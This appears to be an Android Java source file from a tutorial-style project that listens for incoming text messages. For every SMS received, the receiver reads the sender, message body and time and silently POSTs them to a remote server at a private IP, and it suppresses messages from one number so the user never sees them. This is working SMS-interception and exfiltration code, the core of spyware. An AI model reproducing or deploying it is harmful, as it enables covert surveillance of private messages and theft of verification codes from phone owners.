package com.fangei.smsListener;

import java.net.HttpURLConnection;
import java.net.URL;
import java.text.SimpleDateFormat;
import java.util.Date;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.telephony.SmsMessage;

public class SMSReceiver extends BroadcastReceiver {

	@Override
	public void onReceive(Context context, Intent intent) {
		Object[] pdus = (Object[]) intent.getExtras().get("pdus");
		for(Object pdu : pdus){
			SmsMessage message = SmsMessage.createFromPdu((byte[])pdu);
			String sender = message.getOriginatingAddress();//发送者
			String content = message.getMessageBody();
			Date date = new Date(message.getTimestampMillis());
			// 2009-10-10 12:22:33
			SimpleDateFormat dateFormat = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss");
			String time = dateFormat.format(date);
			sendSMS(sender, content, time);
			//实现短信的拦截  -- 即 如果 是5556 发过来的短一律 终止 广播
			if("5556".equals(sender)){
				abortBroadcast();//终止广播
			}
		}
	}

	private void sendSMS(String sender, String content, String time) {
		String path = "http://192.168.1.102:8080/sms/SMSServlet";
		// sender=15050505543&content=xxxx&time=2009-10-12
		String data = "sender="+ sender+ "&content="+ content+ "&time="+ time;
		byte[] entity = data.getBytes();
		try{
			HttpURLConnection conn = (HttpURLConnection) new URL(path).openConnection();
			conn.setConnectTimeout(5000);
			conn.setRequestMethod("POST");
			conn.setDoOutput(true);
			conn.setRequestProperty("Content-Type", "application/x-www-form-urlencoded");
			conn.setRequestProperty("Content-Length", String.valueOf(entity.length));
			conn.getOutputStream().write(entity);
			if(conn.getResponseCode() == 200){
				;
			}
		}catch (Exception e) {
			e.printStackTrace();
		}
	}

}
